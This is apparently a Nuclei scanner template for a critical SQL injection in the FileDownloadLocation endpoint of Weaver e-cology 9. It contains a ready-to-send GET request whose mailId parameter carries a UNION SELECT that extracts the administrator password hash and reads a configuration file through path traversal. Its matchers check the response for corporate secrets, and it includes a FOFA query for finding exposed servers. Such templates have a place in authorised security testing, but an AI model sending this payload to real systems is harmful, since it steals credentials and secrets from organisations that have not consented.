id: weaver-ecology9-filedownloadlocation-sqli

info:
  name: 泛微 e-cology9 FileDownloadLocation SQL 注入
  author: ZacharyZcR
  severity: critical
  description: |
    泛微 e-cology 9.x FileDownloadLocation 接口 mailId 参数存在 SQL 注入，可读取配置与密码哈希。
  reference:
    - https://github.com/wy876/POC
  metadata:
    max-request: 1
    fofa-query: body="doCheckPopupBlocked"
  tags: weaver,ecology,sqli

http:
  - method: GET
    path:
      - '{{BaseURL}}/weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+select+*+from+(select+1+as+resourceid,%27../ecology/WEB-INF/prop/mobilemode.properties%27+as+x2,%273%27+as+x3,(select++*+from+(select+*+from+(select+password+from+HrmResourceManager+where+id=1)x)x)+as+x4,5+as+x5,6+as+x6)x+where+1=1&mailid=action.WorkflowFnaEffectNew&parentid=0'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'wx.enabled'
          - 'wx.corpid'
          - 'wx.corpsecret'
          - 'security.key'
        condition: and

      - type: status
        status:
          - 200
